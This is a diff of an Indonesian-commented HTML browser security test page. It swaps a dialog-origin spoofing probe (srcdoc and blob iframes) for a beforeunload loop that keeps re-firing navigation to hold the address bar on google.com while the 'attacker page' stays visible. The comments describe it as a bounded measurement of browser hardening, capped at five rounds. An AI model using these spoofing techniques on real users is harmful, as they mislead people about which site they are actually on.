@@ -1,20 +1,26 @@
-<!-- 14 | origin spoof - BARIS ORIGIN DI DIALOG JS | [1-CLICK]
-     GENOME  D=S6 js-dialog  F=srcdoc / blob (dokumen tanpa origin jaringan)  C=click
-     MEKANISME  alert/confirm menampilkan baris "situs ini berkata". Baris itu dihitung dari
-     origin dokumen PEMANGGIL. Dokumen yang lahir tanpa origin jaringannya sendiri (srcdoc, blob)
-     bisa membuat baris itu kosong, terpotong, atau diwarisi - sementara isi pesan dikendalikan penuh.
-     Isi pesan sengaja diisi teks yang menyamar jadi atribusi supaya terlihat mana yang bisa dibaca ulang.
-     EXPECTED-SECURE  dialog selalu menyebut origin sebenarnya, tak bisa kosong, tak bisa didorong keluar layar.
-     Tiga varian dijalankan berurutan: top-level, srcdoc, blob. -->
-<button onclick="go()">Run 14 (3 dialog berurutan)</button>
-<p id=r></p><iframe id=f srcdoc="<script>onmessage=function(){alert('DIALOG DARI SRCDOC\n\nBaris origin di atas menyebut apa?')}<\/script>" style="width:1px;height:1px;border:0"></iframe>
+<!-- 14 | F1 · beforeunload DI-ARM ULANG — jendela diperpanjang tanpa batas | [1-CLICK]
+     Kelanjutan 13. Kalau bar memang berganti selama dialog, jendelanya = lama dialog terbuka.
+     Di 13 itu ditentukan pengguna. Di sini penyerang mengambil alih: setiap kali dialog
+     ditutup dengan Stay, navigasi ditembak LAGI, jadi dialog muncul lagi.
+     Efeknya: keadaan "bar menulis tujuan, layar menampilkan halaman ini" bisa dipertahankan
+     selama yang diinginkan, bukan sedetik-dua detik.
+     DIBATASI KERAS: maksimum 5 putaran, lalu berhenti sendiri. Ini pengukuran, bukan jebakan -
+     pengguna harus selalu bisa keluar. Tekan Cancel pada putaran mana pun untuk berhenti.
+     YANG DICATAT  pada putaran ke berapa bar berhenti berganti? Apakah browser mulai menekan
+     dialog berulang (Chrome membatasi dialog tanpa interaksi)? Itu batas hardening-nya.
+     EXPECTED-SECURE  bar tak pernah berganti, DAN browser membatasi dialog berulang. -->
+<h2 style="font:20px system-ui">HALAMAN PENYERANG</h2>
+<button onclick="go()">Run 14 (maks 5 putaran)</button>
+<button onclick="n=99">STOP sekarang</button>
+<pre id=g style="font:12px/1.7 monospace"></pre>
 <script>
-document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+var n = 0, T = 'https://www.google.com/';
+g.textContent = 'REAL ORIGIN: ' + location.href;
+addEventListener('beforeunload', function (e) { e.preventDefault(); e.returnValue = ''; return ''; });
+function draw() { g.textContent = 'REAL ORIGIN: ' + location.origin + '\nputaran: ' + n + ' / 5\n\nBACA OMNIBOX tiap dialog muncul. Catat putaran mana bar berhenti berganti.'; }
 function go() {
-  alert('DIALOG 1 / top-level\n\nCatat baris origin yang browser tulis di atas pesan ini.');
-  document.getElementById('f').contentWindow.postMessage('x', '*');
-  var b = URL.createObjectURL(new Blob(["<script>alert('DIALOG 3 / blob:\\n\\nBaris origin menyebut apa sekarang?')<\/script>"], { type: 'text/html' }));
-  var i = document.createElement('iframe'); i.src = b; i.style.cssText = 'width:1px;height:1px;border:0';
-  document.body.appendChild(i);
+  if (n >= 5) { draw(); return; }
+  n++; draw(); location.href = T;
+  setTimeout(go, 4000);   // arm ulang setelah pengguna menekan Stay
 }
 </script>
